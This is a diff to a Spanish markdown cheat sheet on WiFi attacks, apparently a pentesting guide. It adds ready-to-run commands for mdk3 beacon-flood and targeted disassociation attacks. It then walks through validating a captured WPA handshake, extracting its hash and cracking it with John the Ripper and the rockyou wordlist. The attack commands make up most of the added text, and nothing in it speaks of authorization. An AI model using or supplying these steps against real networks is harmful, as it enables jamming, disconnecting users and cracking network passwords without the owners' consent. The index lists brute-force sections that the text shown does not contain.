@@ -16,7 +16,20 @@
 * [ATAQUE DE DESAUTENTIFICACION DIRIGIDO](#item7)
 * [ATAQUE DE DESAUTENTIFICACION GLOBAL](#item8)
 * [ATAQUE DDOS (DENIED OF SERVICE)](#item9)
- 
+* [ATAQUE BEACON FLOOD MODE ATTACK](#item10)
+* [ATAQUE DISASSOCIATION AMOK MODE ATTACK](#item11)
+## VALIDACIONES DE HANDSHAKE
+* [VALIDANDO CON PYRiT](#item12)
+## TRATAMIENTO DE LA CAPTURA 
+* [TRATANDO LA CAPTURA DEL HANDSHAKE](#item13)
+* [EXTRACCION DEL HASH EN EL  HANDSHAKE](#item14)
+## FUERZA BRUTA AL HASH > CONTRASEÑA
+* [CON JOHN THE RIPPER](#item15)
+* [FUERZA BRUTA CON AIRCRACK](#item16)
+* [FUERZA BRUTA CON GEMPMK](#item17)
+* [FUERZA BRUTA CON PYRIT](#item18)
+* [FUERZA BRUTA CON PYRIT Y PRECOMPUTACION](#item19)
+
 <a name="item1"></a>
 ### Chequeo de tarjeta y resolucion de conflictos
  
@@ -171,8 +184,80 @@ SINOPSIS: Expulsaremos todos los clientes conectados a una red ,durante un tiemp
 
 ``` $ mdk3 wlan0mon a -a 00:15:dc:5c:61:2f ```
 
+<a name="item10"></a>
+### ATAQUE BEACON FLOOD MODE ATTACK
 
+SINOPSIS: Aqui el objetivo es saturar el espectro de onda (canal de comunicacion del punto
+        de acceso creando muchos puntos de acceso en ese mismo canal
+        Tenemos dos formas de realizar este ataque en ambas atacaremos al CANAL1:
+--Primera, en consola (creara muchos AP Falsos con nombres raros):
 
+``` $ mdk3 wlan0mon b -c 1 ```
+
+--Segunda, en consola(Crearemos a partir de un nombre varios puntos con diferentes numeros):
+
+```
+    $ for i in $(seq 1 10 ); do echo "NOTFOUND$i" >> redes.txt; done
+    $ mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 1
+```
+
+<a name="item11"></a>
+### ATAQUE DISASSOCIATION AMOK MODE ATTACK
+
+SINOPSIS: Es otro tipo de ataque de disasociacion dirigido a una lista de clientes de un 
+        AP , seria como el global pero eligiendo varios clientes selectivamente 
+
+```
+    $ nano blacklist    y dentro copiamos los clientes ESTATIONS a desautentificar
+    $  mdk3 wlan0mon d -w blacklist -c 1 
+```
+
+## VALIDACIONES DE HANDSHAKE
+<a name="item12"></a>
+### VALIDANDO CON PYRiT
+SINOPSIS: Ya con el handshake obtenido con alguna de las tecnicas anteriores vamos a 
+        validarlo para su posterior crackeo 
+``` $ pyrit -R Capture-01-.cap analyze ```
+
+## TRATAMIENTO DE LA CAPTURA
+<a name="item13"></a>
+### TRATANDO LA CAPTURA DEL HANDSHAKE
+
+SINOPSIS: Formaremos el paquete final a partir del Capture-XX.cap con el cual trabajaremos
+        para obtener el hash del handshake.(TAMBIEN SE PUEDE HACER DIRECTAMENTE SOBRE EL CAPTURE-01.CAP)
+        
+``` $ tshark -r Captura-01.cap -R "wlan.fc.type_subtype==0x08 ||  wlan.fc.type_subtype==0x05 || eapol" -2 -w paqfinal -F pcap 2>/dev/null ```
+
+<a name="item14"></a>
+### EXTRACCION DEL HASH EN EL  HANDSHAKE
+
+SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar la 
+        tan deseada contraseña xD
+--De esta forma sacamos un .hccap a partir del .cap 
+
+``` $ aircrack-ng -J  miCaptura Captura-01.cap ```
+
+--Ahora lo pasamos por hccap2john y conseguimos el fichero del hash por fin (Solo queda romperlo por fuerza bruta)
+
+``` $ hccap2john miCaptura.hccap > miHash ```
+
+## FUERZA BRUTA AL HASH > CONTRASEÑA
+<a name="item15"></a>
+### CON JOHN THE RIPPER
+--Asi pasamos un diccionario para romper la contraseña del fichero miHash
+
+ ``` $  mv miHash /usr/share/wordlists 
+    $ cd /usr/share/wordlists
+    $ john --wordlists=rockyou.txt miHash 
+ ```
+ 
+  UNA VEZ A TERMINADO MUESTRA LA CONTRASEÑA PERO PODRIAMOS VERLA ESCRIBIENDO
+  
+ ```
+    $ john --show miHash
+    SINO
+    $ john --show miHash --format=wpapsk-pmk
+ ```
 
 
 
